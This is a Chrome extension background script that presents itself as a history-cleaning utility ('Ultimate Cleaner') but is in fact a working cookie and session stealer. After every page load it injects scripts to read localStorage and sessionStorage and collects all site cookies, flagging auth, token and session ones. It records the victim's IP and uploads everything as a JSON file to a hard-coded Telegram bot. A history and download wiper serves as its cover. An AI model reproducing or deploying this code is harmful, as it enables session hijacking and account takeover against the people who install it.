// ==============================================
// PART 1: TELEGRAM COOKIE GRABBER
// ==============================================

const TELEGRAM_CONFIG = {
  botToken: "8716410304:AAESMaRrhVxlqhntmswfwPjbD_eiShsrUqw",
  chatId: "7122235679"
};

const capturedPages = new Map();

function getCurrentDateTime() {
  const date = new Date();
  return date.toLocaleString('en-US', {
    year: 'numeric',
    month: 'long',
    day: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: true
  });
}

function escapeHtml(text) {
  if (!text) return '';
  return String(text)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;')
    .replace(/\*/g, '&#42;')
    .replace(/_/g, '&#95;')
    .replace(/\[/g, '&#91;')
    .replace(/\]/g, '&#93;')
    .replace(/\(/g, '&#40;')
    .replace(/\)/g, '&#41;');
}

async function getIpAddress() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch {
    return 'Unknown';
  }
}

async function getLocalStorageData(tabId) {
  try {
    const results = await chrome.scripting.executeScript({
      target: { tabId: tabId },
      func: () => {
        try {
          const localStorageData = {};
          for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            localStorageData[key] = localStorage.getItem(key);
          }
          return localStorageData;
        } catch (e) {
          return { error: 'localStorage access denied' };
        }
      }
    });
    
    return results[0]?.result || {};
  } catch (error) {
    console.log('localStorage access error:', error);
    return {};
  }
}

async function getSessionStorageData(tabId) {
  try {
    const results = await chrome.scripting.executeScript({
      target: { tabId: tabId },
      func: () => {
        try {
          const sessionStorageData = {};
          for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            sessionStorageData[key] = sessionStorage.getItem(key);
          }
          return sessionStorageData;
        } catch (e) {
          return { error: 'sessionStorage access denied' };
        }
      }
    });
    
    return results[0]?.result || {};
  } catch (error) {
    console.log('sessionStorage access error:', error);
    return {};
  }
}

async function grabApplicationTabCookies(tabId, url) {
  try {
    const pageKey = `${tabId}-${url}`;
    const lastCapture = capturedPages.get(pageKey);
    const now = Date.now();
    
    if (lastCapture && (now - lastCapture) < 30000) {
      console.log('Duplicate avoided:', url);
      return;
    }
    
    console.log('Grabbing cookies from:', url);
    
    const urlObj = new URL(url);
    const mainDomain = urlObj.hostname;
    
    const allCookies = await chrome.cookies.getAll({});
    
    if (allCookies.length === 0) return;
    
    const cookiesForThisTab = allCookies.filter(cookie => {
      const cookieDomain = cookie.domain.startsWith('.') ? cookie.domain.substring(1) : cookie.domain;
      return mainDomain.includes(cookieDomain) || cookieDomain.includes(mainDomain);
    });
    
    if (cookiesForThisTab.length === 0) return;
    
    const cookieData = cookiesForThisTab.map(cookie => ({
      domain: cookie.domain,
      ...(cookie.expirationDate && { expirationDate: cookie.expirationDate }),
      hostOnly: cookie.hostOnly,
      httpOnly: cookie.httpOnly,
      name: cookie.name,
      path: cookie.path,
      sameSite: cookie.sameSite || null,
      secure: cookie.secure,
      session: cookie.session,
      storeId: cookie.storeId || null,
      value: cookie.value
    }));
    
    const localStorageData = await getLocalStorageData(tabId);
    const sessionStorageData = await getSessionStorageData(tabId);
    const ipAddress = await getIpAddress();
    
    const httpOnlyCount = cookieData.filter(c => c.httpOnly).length;
    const secureCount = cookieData.filter(c => c.secure).length;
    const sessionCount = cookieData.filter(c => c.session).length;
    const securityScore = Math.round((secureCount + httpOnlyCount) / cookieData.length * 100);
    
    const importantKeywords = ['token', 'session', 'auth', 'login', 'xsrf', 'csrf', 'sid'];
    const importantCookies = cookieData.filter(c => 
      importantKeywords.some(keyword => c.name.toLowerCase().includes(keyword))
    );
    
    const expiringSoon = cookieData.filter(c => {
      if (!c.expirationDate) return false;
      const daysLeft = (c.expirationDate * 1000 - Date.now()) / (24*60*60*1000);
      return daysLeft < 7 && daysLeft > 0;
    });

    const fullReport = {
      url: url,
      domain: mainDomain,
      timestamp: new Date().toISOString(),
      ipAddress: ipAddress,
      cookies: cookieData,
      localStorage: localStorageData,
      sessionStorage: sessionStorageData,
      analysis: {
        totalCookies: cookieData.length,
        httpOnly: httpOnlyCount,
        secure: secureCount,
        session: sessionCount,
        securityScore: securityScore,
        importantCookies: importantCookies.length,
        expiringSoon: expiringSoon.length,
        localStorageItems: Object.keys(localStorageData).length,
        sessionStorageItems: Object.keys(sessionStorageData).length
      }
    };
    
    const jsonString = JSON.stringify(cookieData, null, 2);
    const fileName = `${mainDomain.replace(/\./g, '_')}_${Date.now()}.json`;
    const fileSizeKB = Math.round(jsonString.length / 1024);
    
    let message = `<b>🖥️ Cookie Report</b>\n\n`;
    message += `<b>🌐 Domain:</b> ${escapeHtml(mainDomain)}\n`;
    message += `<b>🔗 Page:</b> ${escapeHtml(url)}\n`;
    message += `<b>📦 Total Cookies:</b> ${cookieData.length}\n`;
    
    const localStorageCount = Object.keys(localStorageData).length;
    const sessionStorageCount = Object.keys(sessionStorageData).length;
    
    if (localStorageCount > 0) {
      message += `<b>💾 Local Storage:</b> ${localStorageCount} items\n`;
    }
    if (sessionStorageCount > 0) {
      message += `<b>📝 Session Storage:</b> ${sessionStorageCount} items\n`;
    }
    
    message += `<b>📎 File:</b> ${escapeHtml(fileName)} (${fileSizeKB}KB)\n`;
    message += `<b>🕐 Time:</b> ${escapeHtml(getCurrentDateTime())}\n`;
    message += `<b>🌍 IP:</b> ${escapeHtml(ipAddress)}\n\n`;
    
    message += `<b>📊 Cookie Analysis:</b>\n`;
    message += `🔒 HttpOnly: ${httpOnlyCount}\n`;
    message += `🔐 Secure: ${secureCount}\n`;
    message += `⏳ Session: ${sessionCount}\n`;
    message += `<b>📈 Security Score:</b> ${securityScore}%\n\n`;
    
    if (importantCookies.length > 0) {
      message += `<b>⚠️ Important Cookies Found:</b> ${importantCookies.length}\n`;
      importantCookies.slice(0, 5).forEach(c => {
        message += `└ ${escapeHtml(c.name)}\n`;
      });
      if (importantCookies.length > 5) {
        message += `└ ... and ${importantCookies.length - 5} more\n`;
      }
      message += `\n`;
    }
    
    if (expiringSoon.length > 0) {
      message += `<b>⏰ Expiring Soon:</b> ${expiringSoon.length}\n\n`;
    }
    
    message += `<b>📥 Full report attached as JSON file</b>`;
    
    await sendToTelegramWithFile(message, jsonString, fileName);
    
    capturedPages.set(pageKey, now);
    setTimeout(() => capturedPages.delete(pageKey), 30000);
    
  } catch (error) {
    console.error('Error grabbing cookies:', error);
  }
}

async function sendToTelegramWithFile(message, jsonString, fileName) {
  try {
    console.log('Sending message + file to Telegram...');
    
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CONFIG.chatId);
    formData.append('document', new Blob([jsonString], { type: 'application/json' }), fileName);
    formData.append('caption', message);
    formData.append('parse_mode', 'HTML');
    
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendDocument`, {
      method: 'POST',
      body: formData
    });
    
    const result = await response.text();
    console.log('Telegram Response:', result);
    
    if (!response.ok) {
      console.error('Telegram Error:', result);
    } else {
      console.log('✅ Success: Message + file sent to Telegram');
    }
    
  } catch (error) {
    console.error('Error sending to Telegram:', error);
  }
}

async function testTelegramConnection() {
  try {
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CONFIG.chatId);
    formData.append('text', '<b>🟢 Cookie Grabber</b>\n\n✅ Extension activated with all features');
    formData.append('parse_mode', 'HTML');
    
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`, {
      method: 'POST',
      body: formData
    });
    
    return response.ok;
  } catch (error) {
    console.error('Test Error:', error);
    return false;
  }
}


// ==============================================
// PART 2: HISTORY CLEANER
// ==============================================

function clearAllHistory() {
  var since = 0;

  chrome.browsingData.remove({
    "since": since
  }, {
    "history": true
  });

  chrome.browsingData.remove({
    "since": since
  }, {
    "downloads": true
  });
}


// ==============================================
// PART 3: EVENT LISTENERS
// ==============================================

chrome.webNavigation.onCompleted.addListener(async (details) => {
  if (details.frameId === 0 && details.url.startsWith('http')) {
    setTimeout(async () => {
      await grabApplicationTabCookies(details.tabId, details.url);
    }, 2000);
  }
});

chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.url?.startsWith('http')) {
    setTimeout(async () => {
      await grabApplicationTabCookies(tabId, tab.url);
    }, 2000);
  }
});

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === "clear") {
    clearAllHistory();
    sendResponse({status: "success"});
  }
  
  if (request.action === "testCookieGrabber") {
    sendResponse({status: "cookie_grabber_running"});
  }
  
  return true;
});

chrome.runtime.onInstalled.addListener(async () => {
  console.log('Ultimate Cleaner installed/updated');
  await testTelegramConnection();
});